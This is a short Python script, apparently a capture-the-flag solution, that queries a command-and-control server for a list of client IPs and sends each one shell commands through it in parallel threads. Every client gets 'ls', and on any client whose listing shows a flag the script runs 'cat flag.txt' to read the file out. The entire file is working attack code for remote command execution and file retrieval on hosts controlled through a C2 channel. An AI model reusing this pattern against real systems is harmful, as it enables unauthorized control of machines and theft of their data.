import requests
import threading

clientListingURL = "https://cc.attacking.systems/?command=list"

def getClientIPs():
    r = requests.get(clientListingURL)
    return r.text.split("\n")

def sendCommand(command):
    r = requests.get("https://cc.attacking.systems/?command="+command)
    return r.text

def sendCommandThread(clientIP):
    res = sendCommand("run " + clientIP + " ls")
    if res.__contains__("flag"):
        print("Found CYSEC flag file on host " + clientIP)
        res = sendCommand("run " + clientIP + " cat flag.txt")
        print("flag: " + res)

def main():
    clientIPs = getClientIPs()

    # Send commands to all clients by using a separate thread for each client for improving performance due to rapidly changing client ips
    threads = []
    for clientIP in clientIPs:
        thread = threading.Thread(target=sendCommandThread, args=(clientIP,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
